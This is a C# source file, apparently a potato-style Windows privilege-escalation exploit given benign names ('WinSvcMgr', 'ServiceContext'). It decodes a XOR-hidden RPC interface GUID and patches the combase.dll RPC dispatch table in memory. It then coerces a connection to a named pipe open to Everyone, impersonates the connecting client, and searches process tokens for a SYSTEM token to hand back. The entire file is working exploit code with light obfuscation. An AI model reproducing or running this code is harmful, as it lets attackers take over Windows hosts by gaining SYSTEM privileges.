using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Permissions;
using System.Security.Principal;
using System.Threading;
using AccessControl;
using static WinSvcMgr.Core.WinApi;
using static WinSvcMgr.Core.RpcHandler;

namespace WinSvcMgr.Core
{
    public class ServiceContext
    {
        private static Guid orcbRPCGuid
        {
            get
            {
                byte[] enc = { 0x25, 0x52, 0xA2, 0x4D, 0x31, 0xDB, 0x9A, 0x44, 0xCF, 0xA4, 0x55, 0x75, 0xFA, 0x3B, 0x27, 0xA1 };
                byte k = 0x55;
                byte[] dec = new byte[enc.Length];
                for (int i = 0; i < enc.Length; i++)
                    dec[i] = (byte)(enc[i] ^ k);
                return new Guid(dec);
            }
        }
        public IntPtr CombaseModule { get; private set; }
        public IntPtr DispatchTablePtr { get; private set; }
        public IntPtr UseProtseqFunctionPtr { get; private set; } = IntPtr.Zero;
        public uint UseProtseqFunctionParamCount { get; private set; } = 0xffffff;

        private RpcHandler rpcHandler;
        private IntPtr[] dispatchTable = null;
        private short[] fmtStringOffsetTable = null;
        private IntPtr procString = IntPtr.Zero;
        private Delegate useProtseqDelegate;
        private WindowsIdentity systemIdentity;
        private Thread pipeServerThread;
        public TextWriter ConsoleWriter { get; private set; }
        public string PipeName { get; set; }
        public bool IsStart { get; private set; }
        public bool IsHook { get; private set; }

        private static string _pn = "SvcHelper";
        public readonly string serverPipe = $"\\\\.\\pipe\\{_pn}\\pipe\\epmapper";
        public readonly string clientPipe = $"ncacn_np:localhost/pipe/{_pn}[\\pipe\\epmapper]";

        public ServiceContext(TextWriter consoleWriter, string pipeName)
        {
            this.PipeName = pipeName;
            this.rpcHandler = new RpcHandler(this);
            this.ConsoleWriter = consoleWriter;

            InitContext();

            if (CombaseModule == IntPtr.Zero)
                throw new Exception("Module not found");
            else if (dispatchTable == null || procString == IntPtr.Zero || UseProtseqFunctionPtr == IntPtr.Zero)
                throw new Exception("Structure not found");

            else if (UseProtseqFunctionParamCount == 4)
            {
                delegateFun4 df4 = rpcHandler.fun4;
                useProtseqDelegate = df4;
            }
            else if (UseProtseqFunctionParamCount == 5)
            {
                delegateFun5 df5 = rpcHandler.fun5;
                useProtseqDelegate = df5;
            }
            else if (UseProtseqFunctionParamCount == 6)
            {
                delegateFun6 df6 = rpcHandler.fun6;
                useProtseqDelegate = df6;
            }
            else if (UseProtseqFunctionParamCount == 7)
            {
                delegateFun7 df7 = rpcHandler.fun7;
                useProtseqDelegate = df7;
            }
            else if (UseProtseqFunctionParamCount == 8)
            {
                delegateFun8 df8 = rpcHandler.fun8;
                useProtseqDelegate = df8;
            }
            else if (UseProtseqFunctionParamCount == 9)
            {
                delegateFun9 df9 = rpcHandler.fun9;
                useProtseqDelegate = df9;
            }
            else if (UseProtseqFunctionParamCount == 10)
            {
                delegateFun10 df10 = rpcHandler.fun10;
                useProtseqDelegate = df10;
            }
            else if (UseProtseqFunctionParamCount == 11)
            {
                delegateFun11 df11 = rpcHandler.fun11;
                useProtseqDelegate = df11;
            }
            else if (UseProtseqFunctionParamCount == 12)
            {
                delegateFun12 df12 = rpcHandler.fun12;
                useProtseqDelegate = df12;
            }
            else if (UseProtseqFunctionParamCount == 13)
            {
                delegateFun13 df13 = rpcHandler.fun13;
                useProtseqDelegate = df13;
            }
            else if (UseProtseqFunctionParamCount == 14)
            {
                delegateFun14 df14 = rpcHandler.fun14;
                useProtseqDelegate = df14;
            }
            else
            {
                throw new Exception($"ParamCount == ${UseProtseqFunctionParamCount}");
            }
        }

        protected void InitContext()
        {
            ProcessModuleCollection processModules = Process.GetCurrentProcess().Modules;
            foreach (ProcessModule processModule in processModules)
            {
                if (processModule.ModuleName != null && processModule.ModuleName.ToLower() == "combase.dll")
                {
                    CombaseModule = processModule.BaseAddress;

                    MemoryStream patternStream = new MemoryStream();
                    BinaryWriter binaryWriter = new BinaryWriter(patternStream);
                    binaryWriter.Write(Marshal.SizeOf(typeof(RPC_SERVER_INTERFACE)));
                    binaryWriter.Write(orcbRPCGuid.ToByteArray());
                    binaryWriter.Flush();

                    byte[] dllContent = new byte[processModule.ModuleMemorySize];
                    Marshal.Copy(processModule.BaseAddress, dllContent, 0, dllContent.Length);

                    var s = PatternSearch.Search(dllContent, patternStream.ToArray());

                    RPC_SERVER_INTERFACE rpcServerInterface = (RPC_SERVER_INTERFACE)Marshal.PtrToStructure(new IntPtr(processModule.BaseAddress.ToInt64() + s[0]), typeof(RPC_SERVER_INTERFACE));
                    RPC_DISPATCH_TABLE rpcDispatchTable = (RPC_DISPATCH_TABLE)Marshal.PtrToStructure(rpcServerInterface.DispatchTable, typeof(RPC_DISPATCH_TABLE));
                    MIDL_SERVER_INFO midlServerInfo = (MIDL_SERVER_INFO)Marshal.PtrToStructure(rpcServerInterface.InterpreterInfo, typeof(MIDL_SERVER_INFO));
                    DispatchTablePtr = midlServerInfo.DispatchTable;
                    IntPtr fmtStringOffsetTablePtr = midlServerInfo.FmtStringOffset;
                    procString = midlServerInfo.ProcString;
                    dispatchTable = new IntPtr[rpcDispatchTable.DispatchTableCount];
                    fmtStringOffsetTable = new short[rpcDispatchTable.DispatchTableCount];

                    for (int i = 0; i < dispatchTable.Length; i++)
                        dispatchTable[i] = Marshal.ReadIntPtr(DispatchTablePtr, i * IntPtr.Size);

                    for (int i = 0; i < fmtStringOffsetTable.Length; i++)
                        fmtStringOffsetTable[i] = Marshal.ReadInt16(fmtStringOffsetTablePtr, i * Marshal.SizeOf(typeof(short)));

                    UseProtseqFunctionPtr = dispatchTable[0];
                    UseProtseqFunctionParamCount = Marshal.ReadByte(procString, fmtStringOffsetTable[0] + 19);
                }
            }
        }

        protected void PipeServer()
        {
            IntPtr pipeServerHandle = WinApi.BAD_HANLE;
            IntPtr securityDescriptor;
            uint securityDescriptorSize;

            ConvertStringSecurityDescriptorToSecurityDescriptor("D:(A;OICI;GA;;;WD)", 1, out securityDescriptor, out securityDescriptorSize);

            try
            {
                WinApi.SECURITY_ATTRIBUTES securityAttributes = new WinApi.SECURITY_ATTRIBUTES();
                securityAttributes.pSecurityDescriptor = securityDescriptor;
                securityAttributes.nLength = Marshal.SizeOf(typeof(WinApi.SECURITY_ATTRIBUTES));
                pipeServerHandle = CreateNamedPipe(serverPipe, WinApi.PIPE_ACCESS_DUPLEX, WinApi.PIPE_TYPE_BYTE | WinApi.PIPE_READMODE_BYTE | WinApi.PIPE_WAIT, WinApi.PIPE_UNLIMITED_INSTANCES, 521, 0, 123, ref securityAttributes);

                ConsoleWriter.WriteLine("[*] Pipe " + serverPipe);
                if (pipeServerHandle != BAD_HANLE)
                {
                    bool isConnect = ConnectNamedPipe(pipeServerHandle, IntPtr.Zero);

                    if ((isConnect || Marshal.GetLastWin32Error() == ERROR_PIPE_CONNECTED) && IsStart)
                    {
                        ConsoleWriter.WriteLine("[*] Connected");
                        if (CapturePipeCtx(pipeServerHandle))
                        {
                            systemIdentity = WindowsIdentity.GetCurrent();
                            if (systemIdentity.ImpersonationLevel <= TokenImpersonationLevel.Identification)
                                RevertToSelf();

                            ConsoleWriter.WriteLine("[*] User: " + systemIdentity.Name);
                            ConsoleWriter.WriteLine("[*] Level: " + systemIdentity.ImpersonationLevel);

                            bool isFindToken = false;

                            if (systemIdentity.ImpersonationLevel >= TokenImpersonationLevel.Impersonation)
                            {
                                AccessControl.TokenOps.ListProcessTokens(-1, processToken =>
                                {
                                    if (processToken.SID == "S-1-5-18" && processToken.ImpersonationLevel >= TokenImpersonationLevel.Impersonation && processToken.IntegrityLevel >= AccessControl.IntegrityLevel.SystemIntegrity)
                                    {
                                        systemIdentity = new WindowsIdentity(processToken.TokenHandle);
                                        ConsoleWriter.WriteLine("[*] PID : {0} Token:0x{1:x}  User: {2} Level: {3}", processToken.TargetProcessId, processToken.TargetProcessToken, processToken.UserName, processToken.ImpersonationLevel);
                                        isFindToken = true;
                                        processToken.Close();
                                        return false;
                                    }
                                    processToken.Close();
                                    return true;
                                });
                            }

                            ConsoleWriter.WriteLine("[*] Found : " + isFindToken);
                            RevertToSelf();
                        }
                        else
                        {
                            ConsoleWriter.WriteLine($"[!] Impersonation failed:{Marshal.GetLastWin32Error()}");
                        }
                    }
                    else
                    {
                        ConsoleWriter.WriteLine("[!] Connection timeout");
                    }
                }
                else
                {
                    ConsoleWriter.WriteLine($"[!] Pipe creation failed:{Marshal.GetLastWin32Error()}");
                }
            }
            catch (Exception e)
            {
                ConsoleWriter.WriteLine("[!] " + e.Message);
            }

            if (pipeServerHandle != BAD_HANLE)
                CloseHandle(pipeServerHandle);

            return;
        }

        public void Start()
        {
            if (IsHook && !IsStart)
            {
                pipeServerThread = new Thread(PipeServer);
                pipeServerThread.IsBackground = true;
                pipeServerThread.Start();
                IsStart = true;
            }
            else
            {
                throw new Exception("Not hooked");
            }
        }

        public void HookRPC()
        {
            uint old;
            VirtualProtect(DispatchTablePtr, (uint)(IntPtr.Size * dispatchTable.Length), 0x04, out old);
            Marshal.WriteIntPtr(DispatchTablePtr, Marshal.GetFunctionPointerForDelegate(useProtseqDelegate));
            IsHook = true;
        }
        public void Restore()
        {
            if (IsHook && UseProtseqFunctionPtr != IntPtr.Zero)
                Marshal.WriteIntPtr(DispatchTablePtr, UseProtseqFunctionPtr);
            else
                throw new Exception("Not hooked");
        }
        public void Stop()
        {
            if (IsStart)
            {
                IsStart = false;
                if (pipeServerThread.IsAlive)
                {
                    try
                    {
                        AccessControl.SECURITY_ATTRIBUTES securityAttributes = new AccessControl.SECURITY_ATTRIBUTES();
                        IntPtr pipeClientHandle = AccessControl.NativeMethod.CreateFileW(serverPipe, (int)(AccessControl.NativeMethod.GENERIC_READ | AccessControl.NativeMethod.GENERIC_WRITE), FileShare.ReadWrite, ref securityAttributes, FileMode.Open, 0, IntPtr.Zero);
                        FileStream stream = new FileStream(pipeClientHandle, FileAccess.ReadWrite);
                        stream.WriteByte(0xaa);
                        stream.Flush();
                        stream.Close();
                    }
                    catch (Exception e)
                    {
                        pipeServerThread.Interrupt();
                        pipeServerThread.Abort();
                    }
                }
            }
            else
            {
                throw new Exception("Not started");
            }
        }

        public WindowsIdentity GetToken()
        {
            return systemIdentity;
        }
    }

    class RpcHandler
    {
        private ServiceContext ctx;
        public RpcHandler(ServiceContext ctx)
        {
            this.ctx = ctx;
        }
        public int fun(IntPtr ppdsaNewBindings, IntPtr ppdsaNewSecurity)
        {
            string[] endpoints = { ctx.clientPipe, "ncacn_ip_tcp:localhost" };

            int entrieSize = 3;
            for (int i = 0; i < endpoints.Length; i++)
            {
                entrieSize += endpoints[i].Length;
                entrieSize++;
            }

            int memroySize = entrieSize * 2 + 10;
            IntPtr pdsaNewBindings = Marshal.AllocHGlobal(memroySize);

            for (int i = 0; i < memroySize; i++)
                Marshal.WriteByte(pdsaNewBindings, i, 0x00);

            int offset = 0;
            Marshal.WriteInt16(pdsaNewBindings, offset, (short)entrieSize);
            offset += 2;
            Marshal.WriteInt16(pdsaNewBindings, offset, (short)(entrieSize - 2));
            offset += 2;

            for (int i = 0; i < endpoints.Length; i++)
            {
                string endpoint = endpoints[i];
                for (int j = 0; j < endpoint.Length; j++)
                {
                    Marshal.WriteInt16(pdsaNewBindings, offset, (short)endpoint[j]);
                    offset += 2;
                }
                offset += 2;
            }
            Marshal.WriteIntPtr(ppdsaNewBindings, pdsaNewBindings);

            return 0;
        }
        public delegate int delegateFun4(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3);
        public delegate int delegateFun5(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4);
        public delegate int delegateFun6(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4, IntPtr p5);
        public delegate int delegateFun7(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4, IntPtr p5, IntPtr p6);
        public delegate int delegateFun8(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4, IntPtr p5, IntPtr p6, IntPtr p7);
        public delegate int delegateFun9(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4, IntPtr p5, IntPtr p6, IntPtr p7, IntPtr p8);
        public delegate int delegateFun10(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4, IntPtr p5, IntPtr p6, IntPtr p7, IntPtr p8, IntPtr p9);
        public delegate int delegateFun11(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4, IntPtr p5, IntPtr p6, IntPtr p7, IntPtr p8, IntPtr p9, IntPtr p10);
        public delegate int delegateFun12(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4, IntPtr p5, IntPtr p6, IntPtr p7, IntPtr p8, IntPtr p9, IntPtr p10, IntPtr p11);
        public delegate int delegateFun13(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4, IntPtr p5, IntPtr p6, IntPtr p7, IntPtr p8, IntPtr p9, IntPtr p10, IntPtr p11, IntPtr p12);
        public delegate int delegateFun14(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4, IntPtr p5, IntPtr p6, IntPtr p7, IntPtr p8, IntPtr p9, IntPtr p10, IntPtr p11, IntPtr p12, IntPtr p13);
        public int fun4(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3)
        { return fun(p2, p3); }
        public int fun5(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4)
        { return fun(p3, p4); }
        public int fun6(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4, IntPtr p5)
        { return fun(p4, p5); }
        public int fun7(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4, IntPtr p5, IntPtr p6)
        { return fun(p5, p6); }
        public int fun8(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4, IntPtr p5, IntPtr p6, IntPtr p7)
        { return fun(p6, p7); }
        public int fun9(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4, IntPtr p5, IntPtr p6, IntPtr p7, IntPtr p8)
        { return fun(p7, p8); }
        public int fun10(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4, IntPtr p5, IntPtr p6, IntPtr p7, IntPtr p8, IntPtr p9)
        { return fun(p8, p9); }
        public int fun11(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4, IntPtr p5, IntPtr p6, IntPtr p7, IntPtr p8, IntPtr p9, IntPtr p10)
        { return fun(p9, p10); }
        public int fun12(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4, IntPtr p5, IntPtr p6, IntPtr p7, IntPtr p8, IntPtr p9, IntPtr p10, IntPtr p11)
        { return fun(p10, p11); }
        public int fun13(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4, IntPtr p5, IntPtr p6, IntPtr p7, IntPtr p8, IntPtr p9, IntPtr p10, IntPtr p11, IntPtr p12)
        { return fun(p11, p12); }
        public int fun14(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4, IntPtr p5, IntPtr p6, IntPtr p7, IntPtr p8, IntPtr p9, IntPtr p10, IntPtr p11, IntPtr p12, IntPtr p13)
        { return fun(p12, p13); }
    }

    class PatternSearch
    {
        private static int ALPHA_BET = 512;

        private static int[] ComputeOccurence(byte[] pattern)
        {
            int[] table = new int[ALPHA_BET];
            for (char a = (char)0; a < (char)ALPHA_BET; a++)
                table[a] = -1;
            for (int i = 0; i < pattern.Length; i++)
            {
                byte a = pattern[i];
                table[a] = i;
            }
            return table;
        }

        public static List<int> Search(byte[] text, byte[] pattern)
        {
            List<int> matchs = new List<int>();
            int i = 0;
            int[] table = ComputeOccurence(pattern);
            while (i <= text.Length - pattern.Length)
            {
                int j = 0;
                while (j < pattern.Length && text[i + j] == pattern[j])
                    j++;
                if (j == pattern.Length)
                    matchs.Add(i);
                i += pattern.Length;
                if (i < text.Length)
                    i -= table[text[i]];
            }
            return matchs;
        }
    }
}
